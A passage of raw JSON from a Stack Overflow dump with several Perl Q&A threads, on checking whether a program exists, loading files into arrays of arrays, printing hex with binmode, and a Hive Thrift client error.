"@ThisSuitIsBlackNot I&#39;m checking to see if its installed, so I guess the /usr/bin/ directory."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457110048, "post_id": 35800966, "comment_id": 59272520, "body": "If you <i>know</i> it will be in /usr/bin and nowhere else, you can test for the existence of the full path to the program like syck showed. If you&#39;re relying on the shell to find the program somewhere in your PATH, that approach won&#39;t work; then again, you probably shouldn&#39;t be relying on PATH anyway."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457110166, "post_id": 35800966, "comment_id": 59272612, "body": "Do you mean a <i>bash command</i> (a built-in that is part of the shell, like <code>echo</code>) or do you need to check for the existence of an executable file? Note that, unless your command line contains shell metacharacters, perl will execute it directly without involving the shell"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457110742, "post_id": 35800966, "comment_id": 59272986, "body": "What is <i>halfway through the script</i>? Is it 500\u03bcs, 30 minutes, or a couple days? And is it preceded by stuff that does things that are difficult to roll back?"}, {"owner": {"reputation": 35130, "user_id": 1255289, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5ed02658b2440179f00eeff8beb7aa4c?s=128&d=identicon&r=PG", "display_name": "miken32", "link": "https://stackoverflow.com/users/1255289/miken32"}, "edited": false, "score": 0, "creation_date": 1457119535, "post_id": 35800966, "comment_id": 59278189, "body": "This is either a duplicate of one of the linked questions, or it&#39;s opinion-based. Just try them both and see which one works better for you."}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1457109527, "post_id": 35801196, "comment_id": 59272130, "body": "The <code>open</code> is superfluous. Just <code>execute_bash_stuff() if -x $filename</code>. You would make a lot of people who are familiar with Perl happy if you kept to <code>snake_case</code> variables. Ultimately I&#39;m not sure that this answers what the OP is asking"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457110583, "post_id": 35801196, "comment_id": 59272880, "body": "No need to comment on a fix"}], "tags": [], "owner": {"reputation": 2847, "user_id": 5049185, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/46f0d2dc8ee06f428e43d0d115a57c4f?s=128&d=identicon&r=PG&f=1", "display_name": "syck", "link": "https://stackoverflow.com/users/5049185/syck"}, "is_accepted": false, "score": 1, "last_activity_date": 1457109695, "last_edit_date": 1457109695, "creation_date": 1457109100, "answer_id": 35801196, "question_id": 35800966, "link": "https://stackoverflow.com/questions/35800966/checking-whether-a-program-exists/35801196#35801196", "title": "Checking whether a program exists", "body": "<p>With perl, you can test files for existence, readability, executability etc., take a look <a href=\"http://perldoc.perl.org/functions/-X.html\" rel=\"nofollow\">here</a>.</p>\n\n<p>Therefore just use</p>\n\n<pre><code>executeBashStuff() if -x $filename;\n</code></pre>\n\n<p>or <code>stat</code> it:</p>\n\n<pre><code>stat($filename);\nexecuteBashStuff() if -x _;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 3, "last_activity_date": 1457110406, "creation_date": 1457110406, "answer_id": 35801659, "question_id": 35800966, "link": "https://stackoverflow.com/questions/35800966/checking-whether-a-program-exists/35801659#35801659", "title": "Checking whether a program exists", "body": "<p>My best guess is that you want to check for existence of an executable file that you want to run using <code>system</code> or <code>qx//</code></p>\n\n<p>But if you want your command line to behave the same way as the shell, then you can probably use <a href=\"http://metacpan.org/module/File::Which\" rel=\"nofollow\"><code>File::Which</code></a></p>\n"}, {"tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 2, "last_activity_date": 1558770640, "last_edit_date": 1558770640, "creation_date": 1457118691, "answer_id": 35804206, "question_id": 35800966, "link": "https://stackoverflow.com/questions/35800966/checking-whether-a-program-exists/35804206#35804206", "title": "Checking whether a program exists", "body": "<p>To me it seems that a better check is to run the program at the beginning of the script (with <code>-V</code> say). </p>\n\n<p>I'd use the same invocation as you use to run the job later (via shell or not, via <code>execvp</code>). Once at it, make sure to see whether it threw errors. This is also discussed in your link but I would in fact get the output back (<em>not</em> send it away) and check that. This is the surest way to see whether the thing actually runs out of your program and whether it is what you expect it to be. </p>\n\n<p>Checking for the executable with <code>-x</code> (if you know the path) is useful, too, but it only tells you that a file with a given name is there and that it is executable.</p>\n\n<p>The system's <code>which</code> seems to be beset with critism for its possible (mis)behavior, it may or may not be a shell-builtin (which complicates how exactly to use it), is an external utility, and its exact behavior is system dependent. The module <code>File::Which</code> pointed out in <a href=\"https://stackoverflow.com/users/622310/borodin\">Borodin</a>'s answer would be better -- if it is indeed better than <code>which</code>. (What it may well be, I just don't know.)</p>\n\n<hr>\n\n<p><em>Note</em>.  I am not sure what \"<em>bash command</em>\" means: a bash shell built-in, or the fact that you use bash when on terminal? Perl's <code>qx</code> and <code>system</code> use the <code>sh</code> shell, not <code>bash</code> (if they invoke the shell, which depends on how you use them). There are differences, and you cannot rely on your shell configuration. You can also actually run a shell, <code>qx(/path/bash -c 'comm args')</code>, if you must. Mind the quotes. You may need to play with it to find the exact syntax on your system. See <a href=\"https://stackoverflow.com/questions/3374082/perl-backticks-use-bash-instead-of-sh\">this page</a> and links.</p>\n"}, {"comments": [{"owner": {"reputation": 11845, "user_id": 3280538, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/pYuGC.jpg?s=128&g=1", "display_name": "flakes", "link": "https://stackoverflow.com/users/3280538/flakes"}, "edited": false, "score": 1, "creation_date": 1595033124, "post_id": 62962690, "comment_id": 111344105, "body": "Oh that&#39;s another interesting option! Just as a personal style note, I think I&#39;d rather use <code>qx&#47;&#47;</code> over backticks as I find that a bit easier to read!"}], "tags": [], "owner": {"reputation": 502, "user_id": 819596, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d255379c9f0a7b2f41d9a77bfbececff?s=128&d=identicon&r=PG", "display_name": "marinara", "link": "https://stackoverflow.com/users/819596/marinara"}, "is_accepted": false, "score": 2, "last_activity_date": 1595026014, "creation_date": 1595026014, "answer_id": 62962690, "question_id": 35800966, "link": "https://stackoverflow.com/questions/35800966/checking-whether-a-program-exists/62962690#62962690", "title": "Checking whether a program exists", "body": "<p>What if we assume that we don't know the command's location?\nThis means that syck's answer won't work, and zdim's answer is incomplete.</p>\n<p>Try this function in perl:</p>\n<pre><code>sub check_exists_command { \n    my $check = `sh -c 'command -v $_[0]'`; \n    return $check;\n}\n# two examples \ncheck_exists_command 'pgrep' or die &quot;$0 requires pgrep&quot;;\ncheck_exists_command 'readlink' or die &quot;$0 requires readlink&quot;;\n</code></pre>\n<p>I just tested it, because I just wrote it.</p>\n"}], "owner": {"reputation": 11845, "user_id": 3280538, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/pYuGC.jpg?s=128&g=1", "display_name": "flakes", "link": "https://stackoverflow.com/users/3280538/flakes"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1488, "favorite_count": 1, "accepted_answer_id": 35804206, "answer_count": 4, "score": 3, "last_activity_date": 1595026014, "creation_date": 1457108459, "last_edit_date": 1495540288, "question_id": 35800966, "link": "https://stackoverflow.com/questions/35800966/checking-whether-a-program-exists", "title": "Checking whether a program exists", "body": "<p>In the middle of my perl script I want to execute a bash command. The script takes a long time, so at the beginning of the script I want to see if the command exists. <a href=\"https://stackoverflow.com/a/1882328/3280538\">This answer</a> says to just try and run it and <a href=\"https://stackoverflow.com/questions/592620/check-if-a-program-exists-from-a-bash-script\">this other answer</a> suggests some bash commands to test if the program exists.</p>\n\n<p>Is the latter option the best solution? Are there any better ways to do this check in perl?</p>\n"}, {"tags": ["arrays", "perl", "multidimensional-array"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457107104, "post_id": 35800124, "comment_id": 59270478, "body": "You <i>must always</i> <code>use strict</code> and <code>use warnings &#39;all&#39;</code> at the top of every Perl program that you write"}, {"owner": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "edited": false, "score": 0, "creation_date": 1457116455, "post_id": 35800124, "comment_id": 59276505, "body": "Re clarification: You might as well read all titles into one big list and select randomly from that. Two dimensions just complicate matters."}], "answers": [{"comments": [{"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1457108072, "post_id": 35800305, "comment_id": 59271150, "body": "This will of course clobber the &#39;file1&#39; string from the array element."}], "tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "is_accepted": false, "score": 1, "last_activity_date": 1457107152, "last_edit_date": 1457107152, "creation_date": 1457106730, "answer_id": 35800305, "question_id": 35800124, "link": "https://stackoverflow.com/questions/35800124/loading-files-into-dimensioned-array-in-perl/35800305#35800305", "title": "Loading Files into dimensioned array in perl", "body": "<p><code>Load_File</code> returns a list, so it should not be assigned to the scalar value <code>$filelist[0]</code>. Instead, assign it to a <em>reference</em> to the array returned by <code>Load_File</code>.</p>\n\n<pre><code>$filelist[0] = [ Load_File($filelist[0]) ];\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "is_accepted": false, "score": 0, "last_activity_date": 1457107121, "creation_date": 1457107121, "answer_id": 35800439, "question_id": 35800124, "link": "https://stackoverflow.com/questions/35800124/loading-files-into-dimensioned-array-in-perl/35800439#35800439", "title": "Loading Files into dimensioned array in perl", "body": "<p>Your subroutine returns a list.</p>\n\n<p>For a list to be an array element you have to store an array reference.</p>\n\n<pre><code>sub Load_File{\n # ...\n   return \\@lines;\n}\n</code></pre>\n\n<p>And to access the first line, use index 0.</p>\n\n<pre><code>print \"$filelist[0][0]\\n\";\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457108940, "post_id": 35800443, "comment_id": 59271744, "body": "There is no standard for array processing in the Intel instruction set. But wait, are you saying that Perl doesn&#39;t support arrays of arrays, unless you write some C when it actually can? There are two prevalent ways of representing a multi-dimensional array. The first is the FORTRAN and C way of insisting on a fixed size for every dimension and doing simple arithmetic to locate an element within what is essentially a one-dimensional array. The other is to use references to arrays, so that an N-dimensional array requires that you follow N successive dereferences."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457109129, "post_id": 35800443, "comment_id": 59271881, "body": "Reading again I think you meant something rather more simple, and assumed that the OP expects <code>$filelist[0]</code> to retain its value as the name of the first file while <code>$filelist[0][1]</code> is the contents of that file&#39;s first (second?) line. You may be right, but I hope not"}, {"owner": {"reputation": 3, "user_id": 6019026, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d761ace45aa3b8c1cab31a224f1aaa70?s=128&d=identicon&r=PG&f=1", "display_name": "James Hawkins", "link": "https://stackoverflow.com/users/6019026/james-hawkins"}, "edited": false, "score": 0, "creation_date": 1457110419, "post_id": 35800443, "comment_id": 59272777, "body": "I was actually expecting $filelist[0] to retain its value. I&#39;ve been doing a lot of php programming lately and have gotten used to creating arrays of arrays in PHP"}, {"owner": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457110423, "post_id": 35800443, "comment_id": 59272781, "body": "@Borodin, indeed. And OP explicitly lists it in both question text and data dump. Yes, this looks like just another XY problem, but as formulated right now it is not possible."}, {"owner": {"reputation": 3, "user_id": 6019026, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d761ace45aa3b8c1cab31a224f1aaa70?s=128&d=identicon&r=PG&f=1", "display_name": "James Hawkins", "link": "https://stackoverflow.com/users/6019026/james-hawkins"}, "edited": false, "score": 0, "creation_date": 1457110744, "post_id": 35800443, "comment_id": 59272990, "body": "@Oleg V. Volkov your right, I have found it is not possible following the train of thought I was using. I have updated it with the end goal to see if someone point me in the right direction. Thank you for your clarification!"}], "tags": [], "owner": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "is_accepted": true, "score": 1, "last_activity_date": 1457107132, "creation_date": 1457107132, "answer_id": 35800443, "question_id": 35800124, "link": "https://stackoverflow.com/questions/35800124/loading-files-into-dimensioned-array-in-perl/35800443#35800443", "title": "Loading Files into dimensioned array in perl", "body": "<p>You can't get such structure in Perl (and many other languages for that matter). Each of your second level is actually a separate array and your first level array cells hold reference to those sub-arrays as value. So <code>$filelist[0] = [ \"Line1 of file1\", \"Line2 of file1\", \"Line3 of file1\" ]</code>. <code>$filelist[0]</code> can't be both <code>\"file1\"</code> and <code>[...]</code> at once.</p>\n\n<p>(Well, it is Perl we're talking about, so actually you can, because with enough knowledge of internals you can do many insane things. But you really shouldn't go there at your level and even if you find out how to do that later, you shouldn't do that because it would be unreadable and unmantainable.)</p>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1467890371, "last_edit_date": 1467890371, "creation_date": 1457107480, "answer_id": 35800590, "question_id": 35800124, "link": "https://stackoverflow.com/questions/35800124/loading-files-into-dimensioned-array-in-perl/35800590#35800590", "title": "Loading Files into dimensioned array in perl", "body": "<p>You presumably want an array of arrays. Each element of a Perl array is a <em>scalar value</em>, which means that you must use array <em>references</em> if you want a second level of arrays</p>\n\n<p>You could write something like this, which copies the list returned by <code>load_file</code> into an anonymous array and inserts that into <code>@filelist</code></p>\n\n<pre><code>#!/bin/perl\n\nuse strict;\nuse warnings 'all';\n\nmy @filelist = qw/ file1 file2 file3 /;\n\nsub load_file {\n    my $file_name = shift;\n    open my $handle, '&lt;', $file_name;\n    chomp( my @lines = &lt;$handle&gt; );\n    return @lines;\n}\n\n$filelist[0] = [ load_file( @filelist[0] ) ];\n\nprint \"$filelist[0][1]\\n\";\n</code></pre>\n\n<p>but it would be more efficient to alter <code>load_file</code> so that it returned a reference to its own array by writing</p>\n\n<pre><code>return \\@lines;\n</code></pre>\n\n<p>and you can then keep the rest of your code as it was.</p>\n\n<p>However, unless you need to call <code>load_file</code> more than once, it would be more Perlish to write this</p>\n\n<pre><code>#!/bin/perl\n\nuse strict;\nuse warnings 'all';\n\nmy @filelist = map {\n    open my $fh, '&lt;', $_;\n    chomp ( my @lines = &lt;$fh&gt; );\n    \\@lines;\n} qw/ file1 file2 file3 /;\n\nprint \"$filelist[0][1]\\n\";\n</code></pre>\n\n<p>And are you <em>sure</em> your perl executable is at <code>/bin/perl</code>?</p>\n"}], "owner": {"reputation": 3, "user_id": 6019026, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d761ace45aa3b8c1cab31a224f1aaa70?s=128&d=identicon&r=PG&f=1", "display_name": "James Hawkins", "link": "https://stackoverflow.com/users/6019026/james-hawkins"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 66, "favorite_count": 0, "accepted_answer_id": 35800443, "answer_count": 4, "score": 0, "last_activity_date": 1467890371, "creation_date": 1457106260, "last_edit_date": 1457109903, "question_id": 35800124, "link": "https://stackoverflow.com/questions/35800124/loading-files-into-dimensioned-array-in-perl", "title": "Loading Files into dimensioned array in perl", "body": "<p>I am trying to create a perl script to load file contents into a dimensioned array and it does not seem to be working. Any help would be greatly appreciated! </p>\n\n<p>This is what I am trying but it is not working.</p>\n\n<pre><code>#!/bin/perl\nuse List::Util qw(first);\n@filelist = (\"file1\", \"file2\", \"file3\");\n\nsub Load_File{\n  my $File_Name = shift;\n  open my $handle, '&lt;', $File_Name;\n  chomp( my @lines = &lt;$handle&gt;);\n  close $handle;\n  return @lines;\n}\n\n\n$filelist[0] = Load_File(@filelist[0]);\n\nprint \"$filelist[0][1]\\n\";\n</code></pre>\n\n<p>My expected results would be for $filelist[0] to == \"file1\" and $filelist[0][0] to return the first line of the file with each subsequent sub-array entry being a line in the file.</p>\n\n<p>Data format visualization</p>\n\n<pre><code>$filelist[0] == \"file1\"\n$filelist[0][0] == \"Line1 of file1\"\n$filelist[0][1] == \"Line2 of file1\"\n$filelist[0][2] == \"Line3 of file1\"\n$filelist[1] == \"file2\"\n$filelist[1][0] == \"Line1 of file2\"\n$filelist[1][1] == \"Line2 of file2\"\n$filelist[1][2] == \"Line3 of file2\"\netc.\n</code></pre>\n\n<p>So what am I doing wrong? </p>\n\n<p>Thank you</p>\n\n<p><strong>UPDATE/Clarification:</strong></p>\n\n<p>Thank you for the responses and clarification!</p>\n\n<p>It looks like I am going about this wrong. I am trying to make an automatic random playlist generator. The intent was to set up text files which are just lists of song locations, each text file being a given genre. Then to have the script randomly select one or more songs from each genre and output a randomized M3U playlist. Allowing me to set some genre's to occur at given points. Like select 4 country songs, then 1 hard rock, then 3 of another.</p>\n\n<p>My thought was to use the dimensioned array's then when an array was empty to remove it from the filelist. Using splice with rand to grab a song, remove it from the array, thus random selection would not slow down as it would be selecting from an ever smaller array.</p>\n\n<p>From reading the responses I may have gone down a dead end and need to rethink how to solve it. Pointers are appreciated!</p>\n"}, {"tags": ["perl", "binmode"], "comments": [{"owner": {"reputation": 28754, "user_id": 1153938, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/deBjQ.jpg?s=128&g=1", "display_name": "Vorsprung", "link": "https://stackoverflow.com/users/1153938/vorsprung"}, "edited": false, "score": 0, "creation_date": 1457106237, "post_id": 35800077, "comment_id": 59269857, "body": "presumably you want to read binary data?"}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 0, "last_activity_date": 1457106376, "creation_date": 1457106376, "answer_id": 35800163, "question_id": 35800077, "link": "https://stackoverflow.com/questions/35800077/how-to-print-out-the-hexadecimal-content-of-one-text-using-perl-binmode/35800163#35800163", "title": "How to print out the hexadecimal content of one text using Perl binmode?", "body": "<p><code>binmode</code> would be of no use at doing what you asked. There are currently no PerlIO layers that convert all output bytes but <code>0A</code> to their ASCII hex representation.</p>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1457106496, "creation_date": 1457106496, "answer_id": 35800210, "question_id": 35800077, "link": "https://stackoverflow.com/questions/35800077/how-to-print-out-the-hexadecimal-content-of-one-text-using-perl-binmode/35800210#35800210", "title": "How to print out the hexadecimal content of one text using Perl binmode?", "body": "<p>Are you asking how to do that from within a program? The default input mode is the same as <code>binmode</code> on Linux, and on Windows the only difference is that every CR LF is converted to LF.</p>\n\n<p>So you can safely write this.</p>\n\n<pre><code>while (&lt;&gt;) {\n    chomp;\n    printf '%02X, $_ for split //;\n    print \"\\n\";\n}\n</code></pre>\n\n<p>with the proviso that the CR characters will disappear if you are reading a Windows file using a Windows version of perl</p>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1457106961, "creation_date": 1457106961, "answer_id": 35800375, "question_id": 35800077, "link": "https://stackoverflow.com/questions/35800077/how-to-print-out-the-hexadecimal-content-of-one-text-using-perl-binmode/35800375#35800375", "title": "How to print out the hexadecimal content of one text using Perl binmode?", "body": "<p>I don't understand your insistance on using <code>binmode</code>, but perhaps this is what you mean?</p>\n\n<pre><code>perl -le 'print map { sprintf q{%02X}, ord } split //, shift' abcABC\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>616263414243\n</code></pre>\n"}], "owner": {"reputation": 329, "user_id": 3989978, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/c1f202764ac43cbce2910a14aa4204f1?s=128&d=identicon&r=PG&f=1", "display_name": "Zii", "link": "https://stackoverflow.com/users/3989978/zii"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 56, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1457106961, "creation_date": 1457106090, "last_edit_date": 1457106461, "question_id": 35800077, "link": "https://stackoverflow.com/questions/35800077/how-to-print-out-the-hexadecimal-content-of-one-text-using-perl-binmode", "title": "How to print out the hexadecimal content of one text using Perl binmode?", "body": "<p>Can someone tell me how <strong>binmode</strong> in Perl can be used to achieve the same function as following one-liner, so as to print out the hex data of one text ?</p>\n\n<pre><code>$ perl -nle 'print map {sprintf \"%02X\",ord} split //'\n</code></pre>\n\n<p>For example, if I input \"abcABC\", the output will be \"616263414243\".</p>\n\n<p>Please give a similar one-liner using binmode.</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["perl", "apache-hive"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1457105769, "post_id": 35799885, "comment_id": 59269560, "body": "Where does the error come from? From the <code>new</code>, <code>connect</code>, <code>execute</code>, or <code>fetchAll</code>? Also, can you dump the hash to see what&#39;s inside?"}, {"owner": {"reputation": 1293, "user_id": 3090114, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/YC56w.jpg?s=128&g=1", "display_name": "Koushik Chandra", "link": "https://stackoverflow.com/users/3090114/koushik-chandra"}, "edited": false, "score": 0, "creation_date": 1457106108, "post_id": 35799885, "comment_id": 59269787, "body": "The error is coming from <code>execute</code>. Could you please let me know where from can I get hash error details."}], "answers": [{"comments": [{"owner": {"reputation": 1293, "user_id": 3090114, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/YC56w.jpg?s=128&g=1", "display_name": "Koushik Chandra", "link": "https://stackoverflow.com/users/3090114/koushik-chandra"}, "edited": false, "score": 0, "creation_date": 1458883887, "post_id": 36190426, "comment_id": 60061690, "body": "Do you mean should I try with <code>Thrift::API::HiveClient2</code>?"}, {"owner": {"reputation": 195, "user_id": 3552586, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fd710cc3fa918cac780779b4e7bebd2d?s=128&d=identicon&r=PG", "display_name": "JenVander", "link": "https://stackoverflow.com/users/3552586/jenvander"}, "reply_to_user": {"reputation": 1293, "user_id": 3090114, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/YC56w.jpg?s=128&g=1", "display_name": "Koushik Chandra", "link": "https://stackoverflow.com/users/3090114/koushik-chandra"}, "edited": false, "score": 0, "creation_date": 1458914898, "post_id": 36190426, "comment_id": 60074394, "body": "Yes give that a try -- I&#39;ll update the answer, I realize I didn&#39;t word it very well :)"}, {"owner": {"reputation": 1293, "user_id": 3090114, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/YC56w.jpg?s=128&g=1", "display_name": "Koushik Chandra", "link": "https://stackoverflow.com/users/3090114/koushik-chandra"}, "edited": false, "score": 0, "creation_date": 1459139013, "post_id": 36190426, "comment_id": 60141156, "body": "It worked using <code>Thrift::API::HiveClient2</code>(I have updated the original post with the changed code and result) but why it is not working using <code>Thrift::API::HiveClient</code>?"}, {"owner": {"reputation": 195, "user_id": 3552586, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fd710cc3fa918cac780779b4e7bebd2d?s=128&d=identicon&r=PG", "display_name": "JenVander", "link": "https://stackoverflow.com/users/3552586/jenvander"}, "reply_to_user": {"reputation": 1293, "user_id": 3090114, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/YC56w.jpg?s=128&g=1", "display_name": "Koushik Chandra", "link": "https://stackoverflow.com/users/3090114/koushik-chandra"}, "edited": false, "score": 0, "creation_date": 1459174320, "post_id": 36190426, "comment_id": 60156118, "body": "I thought it might have to do with SASL support, however I have recently run into someone that claims to have turned off SASL in their server and had a similar problem executing (auth worked but not exec).  My next guess is that the API changed, creating a rev-lock for client/server versions."}], "tags": [], "owner": {"reputation": 195, "user_id": 3552586, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fd710cc3fa918cac780779b4e7bebd2d?s=128&d=identicon&r=PG", "display_name": "JenVander", "link": "https://stackoverflow.com/users/3552586/jenvander"}, "is_accepted": true, "score": 0, "last_activity_date": 1458915070, "last_edit_date": 1458915070, "creation_date": 1458774547, "answer_id": 36190426, "question_id": 35799885, "link": "https://stackoverflow.com/questions/35799885/why-do-i-get-the-error-thrifttexception-hash0x122b9e0-when-i-try-to-execut/36190426#36190426", "title": "Why do I get the error &quot;Thrift::TException=HASH(0x122b9e0)&quot; when I try to execute a statement with Thrift::API::HiveClient?", "body": "<p>Since you are using HiveServer2, try using Thrift::API::HiveClient2.  If that doesn't work, you could put some debug prints into the client to see if there is anything going on vis-a-vis the network, e.g. timeouts.</p>\n"}, {"comments": [{"owner": {"reputation": 2470, "user_id": 5832518, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-cKPiUtKxJvw/AAAAAAAAAAI/AAAAAAAAAmQ/egOpZRu_8Bk/photo.jpg?sz=128", "display_name": "Raju", "link": "https://stackoverflow.com/users/5832518/raju"}, "edited": false, "score": 0, "creation_date": 1463271127, "post_id": 37232967, "comment_id": 61995912, "body": 